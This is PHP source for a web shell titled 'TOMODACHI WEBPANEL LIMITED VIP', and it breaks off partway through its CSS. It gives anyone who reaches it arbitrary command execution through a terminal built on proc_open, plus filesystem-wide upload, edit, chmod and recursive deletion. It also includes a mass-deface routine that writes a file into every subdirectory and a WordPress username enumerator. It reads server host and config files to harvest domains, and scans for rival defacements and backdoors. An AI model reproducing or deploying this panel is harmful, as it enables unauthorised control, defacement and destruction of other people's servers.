<?php
// TOMODACHI WEBPANEL LIMITED VIP - Minimal Version
session_start(); // Untuk tracking NEW files/folders dan history

// Session untuk pesan flash
if (!isset($_SESSION['flash_messages'])) {
    $_SESSION['flash_messages'] = [];
}

// Fungsi untuk menambah flash message
function add_flash_message($type, $message) {
    $_SESSION['flash_messages'][] = [
        'type' => $type,
        'message' => $message,
        'time' => time()
    ];
}

// Tampilkan dan hapus flash messages
function get_flash_messages() {
    $messages = $_SESSION['flash_messages'] ?? [];
    $_SESSION['flash_messages'] = [];
    return $messages;
}

$cwd = isset($_GET['c']) ? $_GET['c'] : getcwd();
$cwd = realpath($cwd) ?: '/';

// Logging function
function log_activity($action, $details) {
    $log_file = __DIR__ . '/activity.log';
    $timestamp = date('Y-m-d H:i:s');
    $entry = "[$timestamp] $action: $details\n";
    file_put_contents($log_file, $entry, FILE_APPEND);
}

// Navigation
if(isset($_POST['nav_up'])) {
    $new_cwd = dirname($cwd);
    log_activity('Navigation', "Navigated up to $new_cwd");
    add_flash_message('info', 'Navigated up directory');
    header("Location: ?c=".urlencode($new_cwd));
    exit;
}
if(isset($_POST['nav_home'])) {
    $new_cwd = getcwd();
    log_activity('Navigation', "Navigated to home $new_cwd");
    add_flash_message('info', 'Navigated to home directory');
    header("Location: ?c=".urlencode($new_cwd));
    exit;
}

// Music toggle dengan AJAX
if(isset($_POST['toggle_music_ajax'])) {
    $_SESSION['music_playing'] = !isset($_SESSION['music_playing']) ? true : !$_SESSION['music_playing'];
    echo $_SESSION['music_playing'] ? 'playing' : 'stopped';
    exit;
}

// Mass Delete
if(isset($_POST['mass_delete']) && isset($_POST['selected_files'])) {
    $selected_files = $_POST['selected_files'];
    $count = 0;
    foreach($selected_files as $file) {
        $del = realpath($cwd.'/'.$file);
        if($del && strpos($del, realpath('/')) === 0) {
            if(is_dir($del)) {
                // Delete directory recursively
                $it = new RecursiveDirectoryIterator($del, RecursiveDirectoryIterator::SKIP_DOTS);
                $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
                foreach($files as $file) {
                    if ($file->isDir()){
                        rmdir($file->getRealPath());
                    } else {
                        unlink($file->getRealPath());
                    }
                }
                rmdir($del);
            } else {
                unlink($del);
            }
            $count++;
            log_activity('Mass Delete', "Deleted $del");
        }
    }
    add_flash_message('success', "Successfully deleted $count item(s)");
    header("Location: ?c=".urlencode($cwd));
    exit;
}

// Mass Move
if(isset($_POST['mass_move_submit']) && isset($_POST['selected_files']) && isset($_POST['target_path_move'])) {
    $selected_files = $_POST['selected_files'];
    $target_path = $_POST['target_path_move'];
    $target_path = realpath($target_path) ?: $target_path;
    $count = 0;
    
    foreach($selected_files as $file) {
        $source = realpath($cwd.'/'.$file);
        $destination = $target_path.'/'.$file;
        if($source && strpos($source, realpath('/')) === 0) {
            rename($source, $destination);
            $count++;
            log_activity('Mass Move', "Moved $source to $destination");
        }
    }
    add_flash_message('success', "Successfully moved $count item(s)");
    header("Location: ?c=".urlencode($cwd));
    exit;
}

// Cloning - Fix cloning function (copy file, not delete)
if(isset($_POST['clone_submit']) && isset($_POST['clone_source']) && isset($_POST['clone_target_path'])) {
    $source_file = $_POST['clone_source'];
    $target_path = $_POST['clone_target_path'];
    $source = realpath($cwd.'/'.$source_file);
    
    if($source && strpos($source, realpath('/')) === 0) {
        // Generate unique filename if file exists
        $filename = basename($source);
        $extension = pathinfo($filename, PATHINFO_EXTENSION);
        $basename = pathinfo($filename, PATHINFO_FILENAME);
        $counter = 1;
        
        $target = $target_path . '/' . $filename;
        
        // Check if file exists and generate new name
        while(file_exists($target)) {
            $new_filename = $basename . '(' . $counter . ')' . ($extension ? '.' . $extension : '');
            $target = $target_path . '/' . $new_filename;
            $counter++;
        }
        
        if(is_dir($source)) {
            // Clone directory
            mkdir($target, 0777, true);
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            foreach($iterator as $item) {
                $targetPath = $target . DIRECTORY_SEPARATOR . $iterator->getSubPathName();
                if($item->isDir()) {
                    mkdir($targetPath, 0777, true);
                } else {
                    copy($item, $targetPath);
                }
            }
            $result_message = "Directory cloned successfully to: " . basename($target);
        } else {
            // Clone file
            if(copy($source, $target)) {
                $result_message = "File cloned successfully to: " . basename($target);
            } else {
                $result_message = "Failed to clone file";
            }
        }
        
        log_activity('Cloning', "Cloned $source to $target");
        add_flash_message('success', $result_message);
    } else {
        add_flash_message('error', "Cloning failed - source file not found");
    }
    header("Location: ?c=".urlencode($cwd));
    exit;
}

// Mass Suspected (Rename files with .suspected)
if(isset($_POST['mass_suspected_submit']) && isset($_POST['suspected_path']) && isset($_POST['suspected_keyword'])) {
    $target_path = $_POST['suspected_path'];
    $keyword = $_POST['suspected_keyword'];
    $count = 0;
    
    if(is_dir($target_path)) {
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($target_path, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        
        foreach($files as $file) {
            $old_path = $file->getPathname();
            $filename = $file->getFilename();
            $new_name = $filename . $keyword;
            $new_path = dirname($old_path) . '/' . $new_name;
            
            // Skip if already has .suspected
            if(strpos($filename, $keyword) === false) {
                if(rename($old_path, $new_path)) {
                    $count++;
                    log_activity('Mass Suspected', "Renamed $old_path to $new_path");
                }
            }
        }
        add_flash_message('success', "Successfully renamed $count files/directories with '$keyword'");
    } else {
        add_flash_message('error', "Invalid target path");
    }
    header("Location: ?c=".urlencode($cwd));
    exit;
}

// Mass Deface - Create file massal ke semua directory
if(isset($_POST['mass_deface_submit']) && isset($_POST['deface_filename']) && isset($_POST['deface_content']) && isset($_POST['deface_path'])) {
    $filename = $_POST['deface_filename'];
    $content = $_POST['deface_content'];
    $base_path = $_POST['deface_path'];
    $count = 0;
    
    if(is_dir($base_path)) {
        $dirs = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($base_path, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        
        // First, create in current directory
        $target_file = $base_path . '/' . $filename;
        if(file_put_contents($target_file, $content)) {
            $count++;
            $_SESSION['new_files'][] = ['path' => $target_file, 'time' => time()];
        }
        
        // Create in all subdirectories
        foreach($dirs as $dir) {
            if($dir->isDir()) {
                $target_file = $dir->getPathname() . '/' . $filename;
                if(file_put_contents($target_file, $content)) {
                    $count++;
                    $_SESSION['new_files'][] = ['path' => $target_file, 'time' => time()];
                }
            }
        }
        
        add_flash_message('success', "Successfully created '$filename' in $count directories");
        log_activity('Mass Deface', "Created $filename in $count locations");
    }
    header("Location: ?c=".urlencode($cwd));
    exit;
}

// Delete single
if(isset($_POST['del_file'])) {
    $del = realpath($cwd.'/'.$_POST['del_file']);
    if($del && strpos($del, realpath('/')) === 0) {
        if(is_dir($del)) {
            // Delete directory recursively
            $it = new RecursiveDirectoryIterator($del, RecursiveDirectoryIterator::SKIP_DOTS);
            $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
            foreach($files as $file) {
                if ($file->isDir()){
                    rmdir($file->getRealPath());
                } else {
                    unlink($file->getRealPath());
                }
            }
            rmdir($del);
        } else {
            unlink($del);
        }
        log_activity('Delete', "Deleted $del");
        add_flash_message('success', 'File deleted successfully');
    }
    header("Location: ?c=".urlencode($cwd));
    exit;
}

// Rename
if(isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
    $old = realpath($cwd.'/'.$_POST['rename_old']);
    $new = $cwd.'/'.$_POST['rename_new'];
    if($old && strpos($old, realpath('/')) === 0 && !file_exists($new)) {
        rename($old, $new);
        log_activity('Rename', "Renamed $old to $new");
        add_flash_message('success', 'File renamed successfully');
    } else {
        add_flash_message('error', 'Rename failed - file exists or invalid');
    }
    header("Location: ?c=".urlencode($cwd));
    exit;
}

// Chmod
if(isset($_POST['chmod_file']) && isset($_POST['chmod_perm'])) {
    $file = realpath($cwd.'/'.$_POST['chmod_file']);
    if($file && strpos($file, realpath('/')) === 0) {
        chmod($file, octdec($_POST['chmod_perm']));
        log_activity('Chmod', "Changed permissions of $file to $_POST[chmod_perm]");
        add_flash_message('success', 'Permissions changed successfully');
    }
    header("Location: ?c=".urlencode($cwd));
    exit;
}

// Upload
if(isset($_FILES['f'])) {
    $uploaded_file = $cwd.'/'.$_FILES['f']['name'];
    if(move_uploaded_file($_FILES['f']['tmp_name'], $uploaded_file)) {
        $_SESSION['new_files'][] = ['path' => $uploaded_file, 'time' => time()]; // Track NEW with timestamp
        log_activity('Upload', "Uploaded file to $uploaded_file");
        add_flash_message('success', 'File uploaded successfully');
    } else {
        add_flash_message('error', 'Upload failed');
    }
}

// Create
if(isset($_POST['n'])) {
    $new_item = $cwd.'/'.$_POST['n'];
    if($_POST['t']=='f') {
        if(file_put_contents($new_item,'')) {
            $_SESSION['new_files'][] = ['path' => $new_item, 'time' => time()];
            log_activity('Create', "Created file $new_item");
            add_flash_message('success', 'File created successfully');
        }
    } else {
        if(mkdir($new_item)) {
            $_SESSION['new_files'][] = ['path' => $new_item, 'time' => time()];
            log_activity('Create', "Created folder $new_item");
            add_flash_message('success', 'Folder created successfully');
        }
    }
}

// Edit File - Handle inline editing (without redirect)
if(isset($_POST['edit_file'])) {
    $file_to_edit = realpath($cwd.'/'.$_POST['edit_file']);
    if($file_to_edit && is_file($file_to_edit)) {
        // Set session for editing
        $_SESSION['editing_file'] = $file_to_edit;
    }
}

// Handle save edit
if(isset($_POST['save_edit']) && isset($_POST['edit_file_path']) && isset($_POST['content'])) {
    $file = realpath($_POST['edit_file_path']);
    if($file && strpos($file, realpath('/')) === 0) {
        if(file_put_contents($file, $_POST['content'])) {
            log_activity('Edit', "Edited file $file");
            add_flash_message('success', 'File saved successfully');
            unset($_SESSION['editing_file']);
        }
    }
    header("Location: ?c=".urlencode(dirname($file)));
    exit;
}

// Cancel edit
if(isset($_POST['cancel_edit'])) {
    unset($_SESSION['editing_file']);
    header("Location: ?c=".urlencode($cwd));
    exit;
}

// Mass Deface/Edit (old function - keep for compatibility)
if(isset($_POST['mass_edit'])) {
    $target_name = $_POST['target_name'];
    $target_path = $_POST['target_path'];
    $content = $_POST['mass_content'];
    $target_full_path = $target_path . '/' . $target_name;
    
    if(file_exists($target_full_path)) {
        if(file_put_contents($target_full_path, $content)) {
            log_activity('Mass Edit', "Mass edited $target_full_path with content");
            add_flash_message('success', 'Mass edit completed successfully');
        }
    } else {
        add_flash_message('error', 'Target file not found');
    }
    header("Location: ?c=".urlencode($cwd));
    exit;
}

// WordPress Info Scanner
$wp_info = [];
if(isset($_POST['wp_info'])) {
    $wp_info = scan_wordpress_info($cwd);
    log_activity('WP Scan', "Scanned WordPress info in $cwd");
    add_flash_message('info', 'WordPress scan completed');
}

function scan_wordpress_info($dir) {
    $info = [
        'domain' => $_SERVER['HTTP_HOST'] ?? 'Unknown',
        'login_url' => '',
        'usernames' => [],
        'scan_date' => date('Y-m-d H:i:s'),
        'status' => 'offline',
        'xmlrpc_status' => 'offline',
        'wp_detected' => false
    ];
    
    // Cek jika ini adalah WordPress directory
    $wp_config = $dir . '/wp-config.php';
    if(file_exists($wp_config)) {
        $info['wp_detected'] = true;
        $info['login_url'] = 'http://' . $info['domain'] . '/wp-login.php';
        
        // Cek status website
        $index_file = $dir . '/index.php';
        if(file_exists($index_file)) {
            $content = file_get_contents($index_file);
            if(strpos($content, 'WordPress') !== false || strpos($content, 'wp-') !== false) {
                $info['status'] = 'online';
            }
        }
        
        // Cek XML-RPC
        $xmlrpc_file = $dir . '/xmlrpc.php';
        if(file_exists($xmlrpc_file)) {
            $xmlrpc_content = @file_get_contents('http://' . $info['domain'] . '/xmlrpc.php');
            if($xmlrpc_content && strpos($xmlrpc_content, 'XML-RPC server accepts POST requests only') !== false) {
                $info['xmlrpc_status'] = 'online';
            }
        }
        
        // Enumerate usernames via wp-json
        $wp_json_url = 'http://' . $info['domain'] . '/wp-json/wp/v2/users';
        $json_data = @file_get_contents($wp_json_url);
        if($json_data) {
            $users = json_decode($json_data, true);
            if(is_array($users)) {
                foreach($users as $user) {
                    if(isset($user['name'])) {
                        $info['usernames'][] = $user['name'];
                    }
                    if(isset($user['slug'])) {
                        $info['usernames'][] = $user['slug'];
                    }
                }
            }
        }
        
        // Try author enumeration
        $author_url = 'http://' . $info['domain'] . '/?author=1';
        $author_content = @file_get_contents($author_url);
        if($author_content && preg_match('/author\/([^\/]+)/', $author_content, $matches)) {
            $info['usernames'][] = $matches[1];
        }
        
        // Remove duplicates
        $info['usernames'] = array_unique($info['usernames']);
    }
    
    return $info;
}

// Scanner Penghuni (Hacked files)
$hacked_results = [];
if(isset($_POST['scan_hacked'])) {
    $hacked_results = scan_hacked_files($cwd);
    log_activity('Hacked Scan', "Scanned for hacked files in $cwd");
    add_flash_message('info', 'Hacked files scan completed');
}

function scan_hacked_files($dir) {
    $keywords = [
        'Hacked by', 'Touched by', 'Ransomware', 'Pawned by', 'Ransom', 
        'Owned by', 'Diretas', 'Deface', 'Leaked by', 'Locked by',
        'Casino', 'Maxwin', 'Gacor', 'Judi', 'Bet', 'Slot', 
        'Judol', 'Judi Online', 'Judi Daring', 'Lotre'
    ];
    
    $results = [];
    $files = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    
    $domain = $_SERVER['HTTP_HOST'] ?? 'Unknown';
    
    foreach($files as $file) {
        if($file->isFile()) {
            $filename = $file->getFilename();
            $filepath = $file->getPathname();
            $relative_path = str_replace($dir, '', $filepath);
            
            // Check filename
            $found_in_filename = false;
            $matched_keywords = [];
            
            foreach($keywords as $keyword) {
                if(stripos($filename, $keyword) !== false) {
                    $found_in_filename = true;
                    $matched_keywords[] = $keyword;
                }
            }
            
            // Check file content (for text files)
            $found_in_content = false;
            $text_extensions = ['php', 'html', 'htm', 'txt', 'js', 'css', 'xml', 'json'];
            $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
            
            if(in_array($extension, $text_extensions)) {
                $content = @file_get_contents($filepath);
                if($content) {
                    foreach($keywords as $keyword) {
                        if(stripos($content, $keyword) !== false) {
                            $found_in_content = true;
                            if(!in_array($keyword, $matched_keywords)) {
                                $matched_keywords[] = $keyword;
                            }
                        }
                    }
                }
            }
            
            if($found_in_filename || $found_in_content) {
                // Check file status
                $url = 'http://' . $domain . $relative_path;
                $status = check_url_status($url);
                
                $results[] = [
                    'domain_path' => $domain . $relative_path,
                    'file_path' => $filepath,
                    'filename' => $filename,
                    'upload_time' => date('Y-m-d H:i:s', $file->getMTime()),
                    'status' => $status,
                    'keywords' => implode(', ', array_unique($matched_keywords))
                ];
            }
        }
    }
    
    return $results;
}

function check_url_status($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_NOBODY, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return ($http_code == 200) ? 'Active' : 'Offline';
}

// Scanner NEW files
$new_files_results = [];
if(isset($_POST['scan_new'])) {
    $new_files_results = scan_new_files($cwd);
    log_activity('New Files Scan', "Scanned for new files in $cwd");
    add_flash_message('info', 'New files scan completed');
}

function scan_new_files($dir) {
    $results = [];
    $domain = $_SERVER['HTTP_HOST'] ?? 'Unknown';
    
    if(isset($_SESSION['new_files'])) {
        foreach($_SESSION['new_files'] as $new_file) {
            if(file_exists($new_file['path'])) {
                $relative_path = str_replace($dir, '', $new_file['path']);
                $url = 'http://' . $domain . $relative_path;
                $status = check_url_status($url);
                
                $results[] = [
                    'domain_path' => $domain . $relative_path,
                    'file_path' => $new_file['path'],
                    'filename' => basename($new_file['path']),
                    'upload_time' => date('Y-m-d H:i:s', $new_file['time']),
                    'status' => $status,
                    'type' => is_dir($new_file['path']) ? 'Folder' : 'File'
                ];
            }
        }
    }
    
    return $results;
}

// Scanner Domains (detect real subdomains)
$domain_results = [];
if(isset($_POST['scan_domains'])) {
    $domain_results = scan_real_domains($cwd);
    log_activity('Domain Scan', "Scanned for domains in $cwd");
    add_flash_message('info', 'Domain scan completed');
}

function scan_real_domains($dir) {
    $results = [
        'count' => 0,
        'domains' => []
    ];
    
    // Common domain patterns in files
    $domain_patterns = [
        '/(https?:\/\/)([a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)+)/',
        '/(www\.[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)+)/',
        '/([a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)+\.[a-zA-Z]{2,})/'
    ];
    
    // Scan common config files for domains
    $config_files = [
        '/etc/hostname',
        '/etc/hosts',
        '/etc/apache2/sites-available/',
        '/etc/nginx/sites-available/',
        '/var/www/html/',
        '/home/*/public_html/',
        '/home/*/domains/'
    ];
    
    $found_domains = [];
    
    // Check server hostname first
    $hostname = trim(shell_exec('hostname'));
    if($hostname && preg_match('/[a-zA-Z0-9-]+\.[a-zA-Z]{2,}/', $hostname)) {
        $found_domains[$hostname] = [
            'domain' => $hostname,
            'path' => '/etc/hostname',
            'status' => check_domain_status($hostname)
        ];
    }
    
    // Scan config files
    foreach($config_files as $config_path) {
        if(file_exists($config_path)) {
            if(is_dir($config_path)) {
                $files = glob($config_path . '*');
                foreach($files as $file) {
                    if(is_file($file)) {
                        scan_file_for_domains($file, $found_domains);
                    }
                }
            } else {
                scan_file_for_domains($config_path, $found_domains);
            }
        }
    }
    
    // Scan web files for domains
    $web_files = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    
    foreach($web_files as $file) {
        if($file->isFile()) {
            $ext = strtolower(pathinfo($file->getFilename(), PATHINFO_EXTENSION));
            if(in_array($ext, ['php', 'html', 'htm', 'js', 'txt', 'conf', 'config'])) {
                scan_file_for_domains($file->getPathname(), $found_domains);
            }
        }
    }
    
    $results['count'] = count($found_domains);
    $results['domains'] = array_values($found_domains);
    
    return $results;
}

function scan_file_for_domains($filepath, &$found_domains) {
    $content = @file_get_contents($filepath);
    if($content) {
        // Look for domain patterns
        preg_match_all('/(https?:\/\/)?(www\.)?([a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)+\.[a-zA-Z]{2,})/', $content, $matches);
        
        if(!empty($matches[3])) {
            foreach($matches[3] as $domain) {
                $domain = strtolower(trim($domain));
                // Filter out common non-domain strings
                if(strlen($domain) > 4 && 
                   !preg_match('/^(localhost|127\.|192\.168|10\.|172\.)/', $domain) &&
                   !in_array($domain, ['example.com', 'test.com', 'domain.com'])) {
                    
                    if(!isset($found_domains[$domain])) {
                        $found_domains[$domain] = [
                            'domain' => $domain,
                            'path' => $filepath,
                            'status' => check_domain_status($domain)
                        ];
                    }
                }
            }
        }
    }
}

function check_domain_status($domain) {
    $url = 'http://' . $domain;
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_NOBODY, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return ($http_code == 200) ? 'Active' : 'Offline';
}

// Terminal Command Execution
$terminal_output = '';
$terminal_result = '';
$terminal_cwd = $cwd;
if(isset($_POST['terminal_cmd']) && isset($_POST['terminal_command'])) {
    $command = $_POST['terminal_command'];
    $terminal_cwd = $_POST['terminal_cwd'] ?? $cwd;
    
    if(!empty($command)) {
        // Change directory if needed
        if(strpos($command, 'cd ') === 0) {
            $new_dir = trim(substr($command, 2));
            if($new_dir === '..') {
                $terminal_cwd = dirname($terminal_cwd);
            } elseif($new_dir === '/') {
                $terminal_cwd = '/';
            } elseif(realpath($terminal_cwd . '/' . $new_dir)) {
                $terminal_cwd = realpath($terminal_cwd . '/' . $new_dir);
            } elseif(realpath($new_dir)) {
                $terminal_cwd = realpath($new_dir);
            } else {
                $terminal_result = "cd: no such file or directory: $new_dir\n";
            }
            if(empty($terminal_result)) {
                $terminal_result = "[+] Directory changed to: $terminal_cwd\n";
            }
            $terminal_output = "[user@" . php_uname('n') . "]$ " . $command;
        } else {
            // Execute command
            $descriptorspec = array(
                0 => array("pipe", "r"),  // stdin
                1 => array("pipe", "w"),  // stdout
                2 => array("pipe", "w")   // stderr
            );
            
            $process = proc_open($command, $descriptorspec, $pipes, $terminal_cwd);
            
            if (is_resource($process)) {
                fclose($pipes[0]); // Close stdin
                
                $stdout = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                
                $stderr = stream_get_contents($pipes[2]);
                fclose($pipes[2]);
                
                $return_value = proc_close($process);
                
                $terminal_output = "[user@" . php_uname('n') . "]$ " . $command;
                $terminal_result = "";
                
                if(!empty($stdout)) {
                    $terminal_result .= $stdout;
                }
                if(!empty($stderr)) {
                    $terminal_result .= $stderr;
                }
                if($return_value != 0 && empty($stdout) && empty($stderr)) {
                    $terminal_result .= "Command returned exit code: $return_value\n";
                }
                
                log_activity('Terminal', "Executed command: $command in $terminal_cwd");
            } else {
                $terminal_output = "[user@" . php_uname('n') . "]$ " . $command;
                $terminal_result = "Failed to execute command\n";
            }
        }
    }
}

// Scanner Backdoor
$scan_results = [];
if(isset($_POST['scan_backdoor'])) {
    $scan_results = scan_backdoors($cwd);
    log_activity('Scan', "Scanned for backdoors in $cwd");
    add_flash_message('info', 'Backdoor scan completed');
}

function scan_backdoors($dir) {
    $results = [];
    // Added more shell patterns including upload patterns
    $patterns = [
        'eval', 'base64_decode', 'shell_exec', 'system', 'exec', 
        'passthru', 'preg_replace', 'create_function', 'assert', 
        'include', 'require', 'popen', 'proc_open', 'pcntl_exec',
        '`.*`', '\$_(GET|POST|REQUEST|COOKIE|SERVER)', 'file_put_contents',
        'fwrite', 'fopen', 'readfile', 'highlight_file', 'show_source',
        'phpinfo', 'error_log', 'putenv', 'dl', 'mail', 'curl_exec',
        'curl_init', 'error_reporting', 'session_start', 'set_time_limit',
        'goto', 'null', 'str_replace', 'SISTEMIT_COM_ENC', 'fm_enc',
        'chr', '\$z', 'str_rot13', 'gzinflate', 'cmd', 'move_uploaded_file',
        'upload', 'FILES', 'FILE_UPLOAD', 'UPLOAD_FILE', 'upload_file'
    ];
    
    $files = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    
    foreach($files as $file) {
        if($file->isFile() && in_array(strtolower(pathinfo($file->getFilename(), PATHINFO_EXTENSION)), ['php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'txt', 'html', 'htm'])) {
            $content = @file_get_contents($file->getPathname());
            if($content) {
                $detected = [];
                foreach($patterns as $pattern) {
                    if(preg_match("/$pattern/i", $content)) {
                        $detected[] = $pattern;
                    }
                }
                if(!empty($detected)) {
                    $results[] = [
                        'path' => $file->getPathname(),
                        'domain' => $_SERVER['HTTP_HOST'] ?? 'Unknown',
                        'filename' => $file->getFilename(),
                        'patterns' => implode(', ', array_unique($detected)),
                        'size' => format_size($file->getSize()),
                        'count' => count($detected),
                        'modified' => date('Y-m-d H:i:s', $file->getMTime())
                    ];
                }
            }
        }
    }
    return $results;
}

function format_size($size) {
    $units = ['B', 'KB', 'MB', 'GB'];
    $i = 0;
    while ($size >= 1024 && $i < count($units) - 1) {
        $size /= 1024;
        $i++;
    }
    return round($size, 2) . ' ' . $units[$i];
}

// History
$history = [];
if(isset($_POST['show_history'])) {
    $log_file = __DIR__ . '/activity.log';
    if(file_exists($log_file)) {
        $history = file($log_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    }
    add_flash_message('info', 'History loaded');
}

// Mass Deface Form Toggle
$show_mass_form = isset($_POST['toggle_mass_form']);

// Terminal Toggle
$show_terminal = isset($_POST['show_terminal']);

// Cloning Form Toggle
$show_cloning_form = isset($_POST['toggle_cloning']);

// Mass Suspected Form Toggle
$show_suspected_form = isset($_POST['toggle_suspected']);

// System info
$hdd_info = @disk_free_space("/") ? format_size(@disk_free_space("/")) . ' free / ' . format_size(@disk_total_space("/")) . ' total' : 'N/A';
$php_version = phpversion();

function format_perms($perms) {
    $info = '';
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function get_perm_color($perms) {
    $perm_str = format_perms($perms);
    if (strpos($perm_str, 'rw') !== false && strpos($perm_str, 'r--') !== false) return 'green'; // -rw-r--r--
    if (strpos($perm_str, 'drwxr-xr-x') !== false) return 'green'; // drwxr-xr-x
    if (strpos($perm_str, 'dr-xr-x---') !== false) return 'yellow'; // dr-xr-x---
    if (strpos($perm_str, '-r--r--r--') !== false) return 'red'; // -r--r--r--
    return 'white'; // default
}

// Get flash messages
$flash_messages = get_flash_messages();

// Check if editing file
$editing_file = $_SESSION['editing_file'] ?? null;
$file_content = '';
if($editing_file && file_exists($editing_file)) {
    $file_content = file_get_contents($editing_file);
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>TOMODACHI WEBPANEL LIMITED VIP</title>
<style>
body{background:#0d1117;color:#c9d1d9;margin:0;padding:10px;font-family:monospace;}
a{color:#58a6ff;text-decoration:none;}
input,button,select,textarea{
    background:#161b22;color:#c9d1d9;border:1px solid #30363d;
    padding:4px;margin:2px;border-radius:3px;
    font-family:monospace;
    font-size:0.9em;
}
.small-input {width: 120px; padding: 3px; font-size: 0.85em;}
button {
    cursor:pointer;
    background:#21262d;
    transition: all 0.3s ease;
    box-shadow: 0 2px 4px rgba(0,0,0,0.2);
}
button:hover {
    background:#30363d;
    box-shadow: 0 0 15px rgba(88, 166, 255, 0.5);
    transform: translateY(-1px);
}
table{width:100%;border-collapse:collapse;}
td,th{padding:8px;border-bottom:1px solid #30363d;}
tr:hover{background:#161b22;}
.file-item:hover {
    box-shadow: 0 0 15px rgba(88, 166, 255, 0.5);
    transition: box-shadow 0.3s ease;
    border-radius: 3px;
}
.hover-effect:hover {color: #f0c674; transition: color 0.3s;}
.new-label {color: #ff69b4;}
@keyframes blink-red-white {
    0%, 50% {color: #ff0000; text-shadow: 0 0 10px #ff0000;}
    51%, 100% {color: #ffffff; text-shadow: 0 0 10px #ffffff;}
}
.panel-title {
    font-size: 1.5em;
    font-weight: bold;
    animation: blink-red-white 1s infinite;
    text-align: center;
    display: block;
    margin: 10px 0;
}
.system-info {
    text-align: center;
    color: #8b949e;
    font-size: 0.9em;
    margin: 5px 0;
}
.nav-buttons {
    text-align: center;
    margin: 10px 0;
}
@keyframes blink-green {0%, 50% {color: green;} 51%, 100% {color: #00ff00;}}
@keyframes blink-yellow {0%, 50% {color: yellow;} 51%, 100% {color: #ffff00;}}
@keyframes blink-red {0%, 50% {color: red;} 51%, 100% {color: #ff0000;}}
.perm-green {animation: blink-green 1s infinite;}
.perm-yellow {animation: blink-yellow 1s infinite;}
.perm-red {animation: blink-red 1s infinite;}
.checkbox-cell {width: 30px; text-align: center;}
.mass-form-container, .cloning-container, .suspected-container {
    background:#161b22;
    padding:12px;
    border-radius:5px;
    margin-bottom:10px;
    border:1px solid #30363d;
}
.mass-form-content {
    max-height: 200px;
    overflow-y: auto;
    margin: 8px 0;
}
.terminal-container {
    background:#161b22;
    padding:12px;
    border-radius:5px;
    margin-bottom:10px;
    border:1px solid #30363d;
    max-height: 500px;
    overflow-y: auto;
}
.terminal-output {
    background:#0d1117;
    color:#00ff00;
    padding:10px;
    border-radius:3px;
    margin:8px 0;
    max-height: 200px;
    overflow-y: auto;
    white-space: pre-wrap;
    font-family: monospace;
    font-size: 0.9em;
    border: 1px solid #30363d;
}
.terminal-command {
    background:#0d1117;
    color:#ffffff;
    padding:10px;
    border-radius:3px;
    margin:8px 0;
    white-space: pre-wrap;
    font-family: monospace;
    font-size: 0.9em;
    border: 1px solid #30363d;
}
.terminal-result {
    background:#0d1117;
    color:#c9d1d9;
    padding:10px;
    border-radius:3px;
    margin:8px 0;
    max-height: 200px;
    overflow-y: auto;
    white-space: pre-wrap;
    font-family: monospace;
    font-size: 0.9em;
    border: 1px solid #30363d;
}
.status-online {color: #00ff00; font-weight: bold;}
.status-offline {color: #ff0000; font-weight: bold;}
.wp-info-container, .scan-results-container {
    background:#161b22;
    padding:12px;
    border-radius:5px;
    margin-bottom:10px;
    border:1px solid #30363d;
    max-height: 400px;
    overflow-y: auto;
}
.mass-move-form {
    display: inline-block;
    margin-left: 10px;
    background:#161b22;
    padding:8px;
    border-radius:5px;
    border:1px solid #30363d;
}
.scan-item {
    padding: 6px;
    margin: 4px 0;
    border-bottom: 1px solid #30363d;
    font-size: 0.9em;
}
.flash-message {
    padding: 8px 12px;
    margin: 8px 0;
